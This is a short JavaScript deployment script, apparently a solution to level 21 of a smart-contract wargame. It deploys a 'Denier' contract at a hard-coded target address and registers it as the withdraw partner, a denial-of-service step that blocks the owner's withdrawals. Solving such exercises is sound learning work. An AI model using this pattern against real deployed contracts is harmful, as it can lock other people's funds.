const level21 = async (deployer, Denier) => {
    const targetAddress = '0xa7d561b5e14036a21c9962205dd80ce16b1a54a5';
    console.log(`Exploiting Level21 target ${targetAddress}...`);

    console.log('Deploying Denier contract...');
    const denier = await deployer.deploy(Denier, targetAddress);

    console.log('Becoming withdraw partner...');
    await denier.setWithdrawPartner();
};

module.exports = level21;